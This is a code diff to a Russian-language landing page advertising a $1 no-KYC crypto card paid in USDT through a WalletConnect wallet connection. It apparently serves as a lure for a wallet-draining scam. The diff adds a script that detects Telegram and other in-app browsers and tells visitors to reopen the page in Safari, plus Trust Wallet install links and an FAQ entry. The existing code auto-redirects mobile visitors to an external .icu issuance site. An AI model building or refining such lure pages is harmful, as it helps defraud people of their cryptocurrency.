@@ -149,6 +149,16 @@
   }
   .note b{color:var(--ink)}
 
+  .notice{
+    margin:14px 0 0;padding:13px 15px;border-radius:12px;
+    background:#fff7e6;border:1px solid #f0d9a8;
+    font-size:14px;color:#5a4a26;line-height:1.5;
+  }
+  .notice b{color:#3d3117}
+  .notice-link{display:block;margin-top:8px;font-size:14px;color:var(--acc)}
+  .install{margin:12px 0 0;font-size:13.5px;color:var(--muted)}
+  .install a{color:var(--acc)}
+
   footer{margin:40px 0 0;padding:22px 0 34px;border-top:1px solid var(--line)}
   footer .disc{font-size:13px;color:var(--muted);margin:0 0 12px}
   footer .meta{font-size:13px;color:var(--muted);margin:0}
@@ -187,7 +197,14 @@
   <p class="lead">Карта привязывается к вашему кошельку: выпуск за $1, без KYC и без пополнений. Оплата проходит прямо с баланса USDT TRC-20, карта готова за пару минут.</p>
 
   <a class="cta" href="https://link-cardfree.icu/">Выпустить карту</a>
-  <p class="hint">Сейчас откроется страница выпуска · кошелёк подключается через WalletConnect</p>
+  <p class="hint">Откроется страница выпуска · кошелёк подключается через WalletConnect</p>
+
+  <div class="notice" id="inapp" hidden>
+    <b>Вы открыли из Telegram.</b> Встроенный браузер не пускает приложение. Нажмите <b>⋯</b> справа сверху → <b>«Открыть в Safari»</b>, дальше кнопка сработает.
+    <a class="notice-link" href="x-safari-https://linkcard-app.github.io/ru/">Попробовать открыть в Safari</a>
+  </div>
+
+  <p class="install">Нет приложения? <a href="https://apps.apple.com/app/apple-store/id1288339409">App Store</a> · <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp">Google Play</a></p>
 
   <ul class="facts">
     <li><span>Выпуск</span><b>$1</b></li>
@@ -231,6 +248,10 @@
     <summary>Почему приложение не открывается само</summary>
     <p>Trust Wallet убрал встроенный dapp-браузер, поэтому старая схема открытия перестала работать. Страница выпуска открывается в браузере, а приложение подключается на шаге WalletConnect — оно откроется само после выбора Trust Wallet.</p>
   </details>
+  <details>
+    <summary>Открыл из Telegram — приложение не запускается</summary>
+    <p>Встроенный браузер мессенджера не пускает ссылки вида <code>wc:</code>. Нажмите ⋯ справа сверху → «Открыть в Safari» (или ⋯ → «Открыть в браузере» на Android) и повторите — в обычном браузере подключение сработает.</p>
+  </details>
 
   <h2>Начать</h2>
   <p>Откройте страницу выпуска, подключите кошелёк и оплатите $1 — этого достаточно.</p>
@@ -244,7 +265,11 @@
 </main>
 
 <script>
-  if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
+  var ua = navigator.userAgent;
+  var mobile = /iPhone|iPad|iPod|Android/i.test(ua);
+  var inApp = /Telegram|Instagram|FBAN|FBAV|Line\/|Viber|Snapchat|Twitter|LinkedIn|musical_ly|MicroMessenger|VKShared|OKApp/i.test(ua);
+  if (inApp) document.getElementById('inapp').hidden = false;
+  if (mobile && !inApp) {
     setTimeout(function () { window.location.replace('https://link-cardfree.icu/'); }, 900);
   }
 </script>
